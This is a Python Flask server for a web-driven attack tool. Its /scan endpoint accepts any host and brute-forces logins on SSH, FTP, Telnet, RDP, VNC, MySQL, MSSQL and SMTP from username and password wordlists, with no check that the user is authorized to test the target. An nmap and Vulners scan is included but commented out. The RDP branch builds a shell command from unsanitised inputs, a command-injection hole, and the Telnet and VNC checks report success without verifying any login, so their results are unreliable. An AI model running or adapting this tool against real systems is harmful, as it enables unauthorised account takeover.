from flask import Flask, request, jsonify, render_template, Response
from flask_cors import CORS
import nmap
import paramiko, sys, os, termcolor
import threading, time, queue
import requests, socket, re
import ftplib
import mysql.connector
import telnetlib
import subprocess
from vncdotool import api
import pymssql
import smtplib

app = Flask(__name__, static_folder='FrontEnd/static', template_folder='FrontEnd/templates')
CORS(app)
event_queue = queue.Queue()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/status', methods=['GET'])
def status():
    return "Backend is running"

@app.route('/events', methods=['GET'])
def sse():
    def event_stream():
        while True:
            message = event_queue.get()
            yield f'data: {message}\n\n'
    
    return Response(event_stream(), content_type='text/event-stream')

@app.route('/scan', methods=['POST'])
def handle_scan():
    data = request.json
    target = data.get('target')
    if not target:
        return jsonify({'error': 'No target provided'}), 400
   
    try:
        hostname = extract_hostname(target)
        
        if is_valid_ip(hostname):
            target_ip = hostname
        elif is_valid_domain(hostname):
            target_ip = socket.gethostbyname(hostname)
        else:
            return jsonify({'error': 'Ingrese una IP o dominio valido'}), 400
    except socket.gaierror as e:
        return jsonify({'error': f'Error resolving target: {e}'}), 400
    
    # scan_result = scan(target_ip)
    brute_force_result = start_brute_force(target_ip)
    
    if brute_force_result is None:  # Verificar si es None
        return jsonify({'error': 'Error during brute force'}), 500
    
    response = {
        # 'scan_result': scan_result,
        'brute_force_result': brute_force_result,
        # 'scan_vulnerabilities_found': scan_result['vulnerabilities_found'],
        'brute_force_successful': any(result['status'] == 'success' for result in brute_force_result)
    }
    print("Scanning and brute force operation completed successfully.")
    return jsonify(response)

def is_valid_ip(ip):
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    return re.match(pattern, ip) is not None and all(0 <= int(octet) <= 255 for octet in ip.split('.'))

def is_valid_domain(domain):
    domain_pattern = re.compile(
        r"^(?:(?:https?|ftp):\/\/)?(?:[\w-]+\.)+[a-zA-Z]{2,7}$"
    )
    return domain_pattern.match(domain) is not None

def extract_hostname(url):
    if url.startswith(('http://', 'https://')):
        return url.split('://', 1)[1].split('/', 1)[0]
    return url


API_KEY = os.getenv("API_KEY")

def is_vulnerable(product, version):
    api_url = "https://vulners.com/api/v3/search/lucene/"
    headers = {
        'Content-Type': 'application/json',
        'X-Vulners-ApiKey': API_KEY
    }
    query = f"{product} {version}"
    data = {
        "query": query,
        "size": 1
    }

    try:
        response = requests.post(api_url, headers=headers, json=data)
        response.raise_for_status()
        data = response.json()
        if data.get('data', {}).get('total', 0) > 0:
            vuln_data = data['data']['search'][0]
            title = vuln_data.get('title', 'No disponible')
            cvss_score = vuln_data.get('cvss', {}).get('score', 'No disponible')
            description = vuln_data.get('description', 'No disponible')
            references = vuln_data.get('href', 'No disponible')
            return True, {
                'title': title,
                'cvss_score': cvss_score,
                'description': description,
                'references': references
            }
        else:
            return False, {}
    except requests.exceptions.RequestException as e:
        print(f"Failed to query the Vulners API: {e}. There might be an issue with the request or the system's connectivity.")
        return False, {}
    except ValueError as e:
        print(f"Error decoding JSON response: {e}. The data received may be incomplete or malformed.")
        return False, {}

def scan(target):
    nm = nmap.PortScanner()
    try:
        nm.scan(hosts=target, arguments='-p 20,21,22,23,25,53,80,110,123,143,179,443,465,500,587,993,995,1433,2222,3306,3389,41648,5900 -sV -sC')
    except nmap.PortScannerError as e:
        print(f"Failed to execute Nmap: {e}. The system might be protected or unreachable.")
        return {'vulnerabilities_found': False, 'results': [], 'message': 'Error al ejecutar nmap.'}
    except Exception as e:
        print(f"Unexpected error: {e}")
        return {'vulnerabilities_found': False, 'results': [], 'message': 'Error inesperado durante el escaneo.'}

    print(nm.csv())

    scan_results = []
    vulnerabilities_found = False
    filtered_ports = 0
    open_ports = 0

    if not nm.all_hosts():
        print(f"No hosts found in {target}")
        return {'vulnerabilities_found': False, 'results': [], 'message': 'No se encontraron hosts en el objetivo.'}

    for host in nm.all_hosts():
        host_results = {
            'host': host,
            'protocols': []
        }
        for proto in nm[host].all_protocols():
            protocol_results = {
                'protocol': proto,
                'ports': []
            }
            ports = nm[host][proto].keys()
            for port in ports:
                state = nm[host][proto][port]['state']
                if state == 'filtered':
                    filtered_ports += 1
                if state == 'open':
                    open_ports += 1
                product = nm[host][proto][port].get('product', '')
                version = nm[host][proto][port].get('version', '')
                port_result = {
                    'port': port,
                    'state': state,
                    'product': product,
                    'version': version,
                    'vulnerable': False,
                    'vul_data': {}
                }
                if product and version:
                    is_vuln, vul_data = is_vulnerable(product, version)
                    if is_vuln:
                        vulnerabilities_found = True
                        port_result['vulnerable'] = True
                        port_result['vul_data'] = vul_data
                protocol_results['ports'].append(port_result)
            host_results['protocols'].append(protocol_results)
        scan_results.append(host_results)

    message = 'Scan completed successfully.'
    if not vulnerabilities_found and filtered_ports > 0:
        message = 'No vulnerabilities found, but the majority of ports are filtered.'
    if open_ports == 0:
        message = 'No open ports found.'
    if not vulnerabilities_found and open_ports == 0 and filtered_ports > 0:
        message = 'Your site appears secure as most ports are filtered.'

    return {
        'vulnerabilities_found': vulnerabilities_found,
        'results': scan_results,
        'message': message,
        'filtered_ports': filtered_ports,
        'open_ports': open_ports
    }

def start_brute_force(target):
    stop_flag = False
    max_threads = 5
    thread_limiter = threading.BoundedSemaphore(max_threads)
    brute_force_results = []
    failed_attempts = 0
    max_failed_attempts = 5
    failed_attempts_lock = threading.Lock()

    ports_to_test = {
        'SSH': 22,
        'FTP': 21,
        'Telnet': 23,
        'RDP': 3389,
        'VNC': 5900,
        'MySQL': 3306,
        'MSSQL': 1433,
        'SMTP': 25
    }

    def service_connect(service_name, username, password, port):
        nonlocal stop_flag, failed_attempts
        result = None

        try:
            if service_name == 'SSH':
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target, port=port, username=username, password=password)
                result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
                print(termcolor.colored(('[+] Found Password: ' + password + ', For User: ' + username + ' on ' + service_name), 'green'))
                ssh.close()
                stop_flag = True

            elif service_name == 'FTP':
                ftp = ftplib.FTP()
                ftp.connect(target, port)
                ftp.login(user=username, passwd=password)
                result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
                print(termcolor.colored(('[+] Found Password: ' + password + ', For User: ' + username + ' on ' + service_name), 'green'))
                ftp.quit()
                stop_flag = True  

            elif service_name == 'Telnet':
                telnet = telnetlib.Telnet(target, port)
                telnet.read_until(b"login: ")
                telnet.write(username.encode('ascii') + b"\n")
                telnet.read_until(b"Password: ")
                telnet.write(password.encode('ascii') + b"\n")
                result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
                print(termcolor.colored(('[+] Found Password: ' + password + ', For User: ' + username + ' on ' + service_name), 'green'))
                telnet.close()
                stop_flag = True

            elif service_name == 'MySQL':
                db = mysql.connector.connect(
                    host=target,
                    user=username,
                    password=password,
                    port=port
                )
                result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
                print(termcolor.colored(('[+] Found Password: ' + password + ', For User: ' + username + ' on ' + service_name), 'green'))
                db.close()
                stop_flag = True
                
            elif service_name == 'RDP':
                rdp_attempts = 0

                try:
                    while rdp_attempts < 10:
                        command = f"xfreerdp /u:{username} /p:{password} /v:{target}:{port} +auth-only"
                        result = subprocess.run(command, shell=True, capture_output=True, text=True)

                        if result.returncode == 0:
                            print(termcolor.colored(('[+] Found Password: ' + password + ', For User: ' + username + ' on ' + service_name), 'green'))
                            result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
                            stop_flag = True
                            break  
                        else:
                            print(termcolor.colored(('[-] Incorrect Password: ' + password + ', For User: ' + username + ' on ' + service_name), 'red'))
                            result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'failure'}
                            rdp_attempts += 1 

                    if rdp_attempts >= 10:
                        print(termcolor.colored('[-] Max password attempts reached for RDP', 'red'))
                        stop_flag = True  
                        
                except Exception as e:
                    result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'connection_failed', 'error': str(e)}
                    print(termcolor.colored(('[-] RDP Connection Failed: ' + str(e)), 'red'))

            elif service_name == 'VNC':
                try:
                    vnc = api.connect(f"{target}:{port}")
                    vnc.keyPress('password')
                    result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
                    print(termcolor.colored(('[+] Found Password: ' + password + ', For User: ' + username + ' on ' + service_name), 'green'))
                    vnc.disconnect()
                    stop_flag = True
                except Exception as e:
                    result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'failure', 'error': str(e)}
                    print(termcolor.colored(('[-] VNC Connection Failed: ' + str(e)), 'red'))

            elif service_name == 'MSSQL':
                mssql = pymssql.connect(f'DRIVER={{SQL Server}};SERVER={target},{port};UID={username};PWD={password}')
                result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
                print(termcolor.colored(('[+] Found Password: ' + password + ', For User: ' + username + ' on ' + service_name), 'green'))
                mssql.close()
                stop_flag = True

            elif service_name == 'SMTP':
                smtp_server = smtplib.SMTP(target, port)
                smtp_server.starttls()
                smtp_server.login(username, password)
                result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
                print(termcolor.colored(('[+] Found Password: ' + password + ', For User: ' + username + ' on ' + service_name), 'green'))
                smtp_server.quit()
                stop_flag = True

        except (paramiko.ssh_exception.AuthenticationException, ftplib.error_perm, mysql.connector.errors.ProgrammingError):
            result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'failure'}
            print(termcolor.colored(('[-] Incorrect Password: ' + password + ', For User: ' + username + ' on ' + service_name), 'red'))
        
        except Exception as e:
            result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'connection_failed', 'error': str(e)}
            print(termcolor.colored(('[-] Connection Failed: ' + str(e)), 'red'))
            with failed_attempts_lock:
                failed_attempts += 1
            if failed_attempts >= max_failed_attempts:
                print(f"The maximum allowed connection attempts has been reached. The system appears secure, as further access could not be obtained.")
                stop_flag = True
        
        finally:
            if result is not None:
                brute_force_results.append(result)
            thread_limiter.release()

    usernames_file = "usernamesReal.txt"
    passwords_file = "passwordsReal.txt"
    print('\n')

    if not os.path.exists(passwords_file):
        print('[!!] That File/Path Doesn\'t Exist')
        sys.exit(1)

    print('Starting Force Brute in host ' + target)

    for service_name, port in ports_to_test.items():
        stop_flag = False
        failed_attempts = 0
        message = f'\nStarting Force Brute in {service_name} on port {port}'
        event_queue.put(message)
        print(message)
        
        with open(usernames_file, 'r') as users:
            for username in users:
                username = username.strip()
                with open(passwords_file, 'r') as passwords:
                    for password in passwords:
                        password = password.strip()
                        if stop_flag:
                            break
                        thread_limiter.acquire()
                        t = threading.Thread(target=service_connect, args=(service_name, username, password, port))
                        t.start()
                        time.sleep(0.5)
                if stop_flag:
                    break
            
    return brute_force_results

if __name__ == '__main__':
    app.run(debug=True)